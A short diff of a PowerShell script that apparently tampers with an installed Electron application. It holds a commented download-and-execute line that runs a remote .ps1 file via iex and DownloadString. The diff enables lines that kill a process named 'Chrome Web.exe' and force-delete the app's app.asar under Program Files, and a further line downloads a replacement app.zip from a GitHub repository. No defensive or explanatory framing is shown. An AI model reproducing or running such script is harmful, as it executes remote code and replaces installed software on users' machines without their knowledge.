@@ -4,9 +4,9 @@
 #powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/asar.ps1')"
 
 
-#Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
+Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
 
-#Remove-Item -Force -Recurse 'C:\Program Files\app-64\resources\app.asar'
+Remove-Item -Force -Recurse 'C:\Program Files\app-64\resources\app.asar'
 
 invoke-webrequest -uri "https://github.com/Admo9/Data/raw/main/app.zip" -outfile "C:\Users\app.zip"
 
